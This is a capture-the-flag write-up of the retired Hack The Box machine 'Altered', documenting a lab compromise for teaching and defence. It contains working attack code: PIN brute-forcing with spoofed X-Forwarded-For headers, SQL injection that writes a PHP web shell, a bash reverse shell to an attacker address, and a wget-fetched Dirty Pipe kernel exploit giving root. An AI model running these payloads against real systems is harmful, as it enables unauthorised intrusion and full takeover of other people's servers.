---
title: "Hack The Box — Altered"
summary: "A spoofed IP bypasses reset PIN rate limits; PHP type juggling exposes SQL injection, MySQL writes a web shell, and Dirty Pipe yields root."
platform: "Hack The Box"
contentType: "machine"
publicationPolicy: "retired"
difficulty: "Hard"
os: "Linux"
solvedAt: 2026-11-16
publishedAt: 2026-11-16
tags:
  - password-reset
  - rate-limit-bypass
  - ip-spoofing
  - php-type-juggling
  - sql-injection
  - arbitrary-file-write
  - dirty-pipe
  - privilege-escalation
tools:
  - Nmap
  - Burp Suite
  - ffuf
  - Python
  - requests
  - curl
  - SearchSploit
  - GCC
cves:
  - CVE-2022-0847
htbUrl: "https://app.hackthebox.com/machines/Altered"
cover: "/images/writeups/hackthebox/machines/altered/cover.png"
coverAlt: "Altered machine artwork showing a split face and blue lightning inside a red border"
featured: false
draft: false
---

> This write-up documents my own run against the authorized Hack The Box lab. The [Altered machine page](https://app.hackthebox.com/machines/Altered) offers the official write-up, which [HTB reserves for retired machines](https://help.hackthebox.com/en/articles/5185338-how-to-play-machines-on-hack-the-box). Flags, live cookies, reset credentials and VPN addresses are omitted. PINs and IP addresses are specific to each instance.

## Executive summary

Altered exposes a Laravel password reset flow with a four-digit PIN. Its per-IP rate limit trusts the client-supplied `X-Forwarded-For` header, so rotating that header lets me test the PIN space and reset the `admin` account. The authenticated player dashboard passes a numeric `id` and a per-profile secret to `/api/getprofile`. A JSON boolean `true` bypasses the secret check through PHP's loose comparison, exposing SQL injection in `id`. The database account can write into nginx's web root, so a `UNION SELECT ... INTO OUTFILE` places a PHP web shell there. The resulting `www-data` shell can read the user flag. Finally, the machine's Linux 5.16.0 kernel is vulnerable to Dirty Pipe (CVE-2022-0847); an exploit that temporarily overwrites a SUID executable gives a root shell.

## Target information

| Item | Value |
| --- | --- |
| Machine | [Altered](https://app.hackthebox.com/machines/Altered) |
| Platform | Hack The Box |
| Difficulty | Hard |
| Operating system | Linux / Ubuntu 20.04.4 |
| Publication status | Retired; the official machine page offers its write-up |
| Main service | UHC March Finals, Laravel behind nginx |

Start the machine and record the IP assigned to your own instance. On Kali, set these variables before using the commands below:

~~~bash
export TARGET_IP='<YOUR_HTB_MACHINE_IP>'
export ATTACKER_IP='<YOUR_TUN0_IP>'
export BASE_URL="http://$TARGET_IP"
~~~

## Enumeration

I began with a full TCP scan and service detection:

~~~bash
nmap -T4 -sC -sV -p- "$TARGET_IP"
~~~

| Port | Observed service | Significance |
| --- | --- | --- |
| 22/tcp | OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 | Potential access after obtaining credentials. |
| 80/tcp | nginx 1.18.0, title “UHC March Finals” | The application attack surface. |

HTTP `/` redirects to `/login`. The `laravel_session` and `XSRF-TOKEN` cookies identify a Laravel application. I browsed the login and password reset pages through Burp Suite, then discovered other routes:

~~~bash
ffuf -u "$BASE_URL/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc all -ac
~~~

`/reset` was useful. `/changepw` returned an error without a valid reset flow, while `/test` contained only static text. On `/reset`, I submitted the known player name `admin` and captured the subsequent request to `/api/resettoken` in Burp Repeater. The request body was `name=admin&pin=0000`; a wrong guess returned `Invalid Pincode. Be sure to use the same browser you requested from.` This told me to preserve the browser's session cookies during the search.

### Bypass the reset rate limit

The API returned `X-RateLimit-Limit: 60` and `X-RateLimit-Remaining: 59`. Changing `X-Forwarded-For` from one syntactically valid IPv4 address to another reset the remaining count. The server was therefore using an untrusted request header as the client identity for rate limiting.

Save the request from Burp as `reset.req`. Retain the current `XSRF-TOKEN` and `laravel_session` values in **your local copy only**. Replace the PIN and forwarded address with ffuf markers; the relevant lines should look like this:

~~~http
POST /api/resettoken HTTP/1.1
Host: <YOUR_HTB_MACHINE_IP>
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: CLIENTIP
Cookie: XSRF-TOKEN=<YOUR_XSRF_COOKIE>; laravel_session=<YOUR_SESSION_COOKIE>

name=admin&pin=PINS
~~~

The `Cookie` line above is a template, not a literal value to send. Keep the original request's other required headers. `PINS` has four characters, matching the four-digit PIN, so a captured `Content-Length: 19` also remains correct.

Generate the complete PIN range and one different valid IPv4 address per attempt:

~~~bash
seq -w 0 9999 > pins.txt
python3 - <<'PY' > ips.txt
for n in range(10000):
    print(f'10.30.{n // 254 + 1}.{n % 254 + 1}')
PY

ffuf -request reset.req -request-proto http \
  -w pins.txt:PINS -w ips.txt:CLIENTIP -mode pitchfork \
  -mc all -fr 'Invalid Pincode' -t 10 -rate 100 \
  -o reset-results.json
~~~

`pitchfork` pairs line N of `pins.txt` with line N of `ips.txt`. Investigate any match rather than accepting it on status code alone: rate-limit pages and transient failures can also differ from the invalid-PIN response. In my run, one candidate produced the **Change Password** page. I replayed that PIN in the same browser session, chose a temporary lab password, and signed in as `admin`. The PIN and password are intentionally omitted because they are session-specific and are not needed in a published write-up.

## Initial access

### Bypass the profile secret check

The authenticated dashboard listed nine player profiles. Clicking **View** sent a request resembling:

~~~http
GET /api/getprofile?id=1&secret=<PROFILE_1_SECRET> HTTP/1.1
Host: <YOUR_HTB_MACHINE_IP>
Cookie: XSRF-TOKEN=<YOUR_XSRF_COOKIE>; laravel_session=<YOUR_SESSION_COOKIE>
~~~

Changing `id` while keeping the original secret returned `Tampered user input detected`. Each profile used a different 32-character secret, so simply changing the numeric identifier was blocked. I then sent `secret` as a JSON boolean instead of the string in the URL:

~~~http
GET /api/getprofile?id=1 HTTP/1.1
Host: <YOUR_HTB_MACHINE_IP>
Content-Type: application/json
Cookie: XSRF-TOKEN=<YOUR_XSRF_COOKIE>; laravel_session=<YOUR_SESSION_COOKIE>
Content-Length: 15

{"secret":true}
~~~

This returned the first player's bio. A non-empty string can compare equal to boolean `true` under PHP loose comparison, so the integrity check no longer constrained `id`. The observable bypass is the important point; the profile secrets themselves do not need to be copied into the article.

### Confirm SQL injection and find the reflected column

Keep the authenticated cookies from your browser. This small helper URL-encodes each SQL expression and retains the JSON body on a GET request, as Burp did:

~~~python
# save as probe.py; run with: python3 -i probe.py
from getpass import getpass
import requests

base = input('Machine URL (for example http://<HTB_IP>): ').rstrip('/')
cookie = getpass('Cookie header from your authenticated browser: ')
session = requests.Session()
session.headers['Cookie'] = cookie

def probe(expression):
    response = session.get(
        f'{base}/api/getprofile',
        params={'id': expression},
        json={'secret': True},
        timeout=10,
    )
    print(response.status_code, repr(response.text[:300]))
    return response

probe('1')
probe('1 ORDER BY 3')
probe('1 ORDER BY 4')
probe('-1 UNION SELECT 111,222,333')
~~~

Run the helper with `python3 -i probe.py` so the later `probe(...)` snippets can be entered at its Python prompt. The baseline and `ORDER BY 3` returned HTTP 200. `ORDER BY 4` returned HTTP 500, suggesting three selected columns. The `UNION` request returned the body `333`, confirming both the three-column shape and that the third column is rendered in the response. The `-1` suppresses the original row so the union row is the one displayed. The application also returned a generic 500 when a predicate selected no row; I did not treat a 500 by itself as proof of SQL injection.

With the third column as an output channel, I queried the database and its table names:

~~~python
probe('-1 UNION SELECT 111,222,VERSION()')
probe('-1 UNION SELECT 111,222,CONCAT(DATABASE(),0x3a,GROUP_CONCAT(table_name)) '
      'FROM information_schema.tables WHERE table_schema=DATABASE()')
probe('-1 UNION SELECT 111,222,GROUP_CONCAT(CONCAT(table_name,0x2e,column_name)) '
      'FROM information_schema.columns '
      "WHERE table_schema=DATABASE() AND table_name IN ('tasks','users')")
~~~

The first query returned MySQL `8.0.28-0ubuntu0.20.04.3`. The database was `uhc`, with `failed_jobs`, `migrations`, `password_resets`, `personal_access_tokens`, `tasks`, and `users`. The `tasks` and `users` schemas were visible, but dumping player password hashes was unnecessary for the path to a shell.

### Turn database file access into a web shell

Next, I checked the database identity and whether MySQL could read local files:

~~~python
probe('-1 UNION SELECT 111,222,CONCAT_WS(0x7c,CURRENT_USER(),'
      'IFNULL(@@secure_file_priv,0x4e554c4c))')
probe("-1 UNION SELECT 111,222,LEFT(LOAD_FILE('/etc/passwd'),200)")
probe("-1 UNION SELECT 111,222,LOAD_FILE('/etc/nginx/sites-enabled/default')")
~~~

`CURRENT_USER()` returned `uhc@localhost`; `@@secure_file_priv` was empty. `LOAD_FILE` returned `/etc/passwd` and the nginx site configuration. The latter showed `root /srv/altered/public;`, which identified a web-served directory. It also showed nginx deriving a `realip` value from `X-Forwarded-For`, consistent with the rate-limit behavior observed earlier.

I first tested a harmless marker file with `INTO OUTFILE` in Burp Repeater:

~~~sql
-1 UNION SELECT 111,222,0x414c54455245445f57524954455f4f4b
INTO OUTFILE '/srv/altered/public/altered_probe.txt'
~~~

The SQL request itself returned HTTP 500, but `curl "$BASE_URL/altered_probe.txt"` returned `111`, `222`, and `ALTERED_WRITE_OK`. The 500 did not mean the write failed; the endpoint apparently errored while trying to render a query that had written to a file. Use a new filename on each retry because `INTO OUTFILE` will not overwrite an existing file.

I then wrote a minimal PHP command endpoint. Hex encoding avoids quote conflicts inside the injected SQL:

~~~python
import secrets

shell_name = f'alt_{secrets.token_hex(6)}.php'
php = b'<?php system($_GET["cmd"]); ?>'
sql = (f"-1 UNION SELECT 111,222,0x{php.hex()} "
       f"INTO OUTFILE '/srv/altered/public/{shell_name}'")
probe(sql)
print('Check:', f'{base}/{shell_name}?cmd=id')
~~~

`curl -sG --data-urlencode 'cmd=id' "${BASE_URL}/${SHELL_NAME}"` returned `uid=33(www-data)` in my run. Set `SHELL_NAME` to the name printed by your script. The `111` and `222` prefix bytes may also appear in the response because `UNION SELECT` writes all three columns to the file.

To obtain an interactive shell, listen on Kali and call the endpoint with your own VPN address:

~~~bash
# Kali terminal 1
nc -lvnp 4444

# Kali terminal 2
export SHELL_NAME='<THE_FILENAME_PRINTED_BY_YOUR_SCRIPT>'
curl -sG \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1'" \
  "$BASE_URL/$SHELL_NAME"
~~~

The listener connected as `www-data`. `/home/htb/user.txt` was readable from that shell; `ls -l` showed world-read permissions. I verified access with `cat /home/htb/user.txt` and withheld the flag value.

## Privilege escalation

Local enumeration showed Ubuntu 20.04.4 with a mainline `5.16.0-051600-generic` kernel. `/usr/bin/su` was SUID root, `gcc` was unavailable on the target, and `wget` was present:

~~~bash
id
uname -a
cat /etc/os-release
ls -l /usr/bin/su /home/htb/user.txt
command -v gcc
command -v wget
~~~

That kernel predates the 5.16.11 fix for [Dirty Pipe (CVE-2022-0847)](https://dirtypipe.cm4all.com/). The vulnerability lets an unprivileged process overwrite data in the page cache for a read-only file, within offset and page-boundary constraints. I used [Exploit-DB 50808](https://www.exploit-db.com/exploits/50808), which temporarily replaces part of a SUID executable, runs it to drop a SUID shell, restores the original bytes, and opens the dropped shell. Review the source before running a kernel exploit; this one modifies `/usr/bin/su` and leaves `/tmp/sh` behind for cleanup.

Because the target lacked a compiler, I built the exploit on Kali and served the binary to the lab machine:

~~~bash
# Kali
searchsploit -m 50808
gcc -static -o dirtypipez 50808.c
python3 -m http.server 8000
~~~

~~~bash
# www-data shell on Altered
cd /tmp
wget "http://<YOUR_TUN0_IP>:8000/dirtypipez" -O dirtypipez
chmod +x dirtypipez
./dirtypipez /usr/bin/su
id
cat /root/root.txt
~~~

In my run, `id` reported `uid=0(root) gid=0(root)`. The root flag was readable; its value is omitted. Substitute your actual Kali VPN address in the `wget` URL. A successful compile and the vulnerable-looking kernel version are only indicators; the root `id` output is the confirmation that the exploit worked.

After verifying the flags, remove the temporary lab artifacts. The exploit source restores the bytes it changed in `/usr/bin/su`, but check that restoration completed before ending the session:

~~~bash
# root shell on Altered; replace the placeholder with your generated PHP filename
rm -f /tmp/dirtypipez /tmp/sh
rm -f /srv/altered/public/altered_probe.txt \
  '/srv/altered/public/<GENERATED_PHP_FILENAME>'
~~~

## What did not work

- A normal `/api/getprofile` request with a changed `id` and the old string secret returned `Tampered user input detected`. The boolean JSON value was needed before SQL expressions reached the vulnerable query.
- A quoted or false SQL predicate returned a generic HTTP 500. Only the contrasting `ORDER BY` behavior and the reflected `UNION` value established a useful injection primitive.
- `/changepw` returned an error before the reset PIN had been validated, and `/test` supplied no route into the application.
- The `tasks` table had no useful rows in this run. Reading and writing through MySQL's file functions gave a shorter path to command execution.

## Attack path

1. Enumerate SSH and the Laravel site; find the password reset flow.
2. Preserve one reset session and rotate `X-Forwarded-For` while testing the four-digit PIN space.
3. Change the admin password and sign in to the player dashboard.
4. Supply JSON `{"secret":true}` to bypass the profile secret check, then inject SQL into `id`.
5. Use the three-column `UNION` output to identify MySQL file access and nginx's web root.
6. Write a PHP web shell with `INTO OUTFILE`, obtain a `www-data` reverse shell, and read the user flag.
7. Exploit Dirty Pipe against a SUID executable and verify root access.

## Lessons learned

- A per-IP throttle is ineffective when the application accepts `X-Forwarded-For` from arbitrary clients. The proxy must overwrite that header or the application must trust only known proxy addresses.
- Integrity checks must compare values of the expected type using strict semantics. Typed JSON input and PHP loose comparison created a path around the profile secret check.
- Database `FILE` privileges and write access to a web-served directory turn SQL injection into server-side code execution. Least privilege and filesystem separation would break that step.
- A vulnerable kernel made a low-privilege web shell sufficient for full system compromise. Kernel patching and minimizing SUID programs reduce this escalation path.

## References

- [Hack The Box — Altered machine page](https://app.hackthebox.com/machines/Altered)
- [Hack The Box — how to play machines and retired write-ups](https://help.hackthebox.com/en/articles/5185338-how-to-play-machines-on-hack-the-box)
- [Max Kellermann — The Dirty Pipe Vulnerability](https://dirtypipe.cm4all.com/)
- [Ubuntu — CVE-2022-0847](https://ubuntu.com/security/CVE-2022-0847)
- [Exploit Database — Dirty Pipe SUID exploit, EDB-ID 50808](https://www.exploit-db.com/exploits/50808)
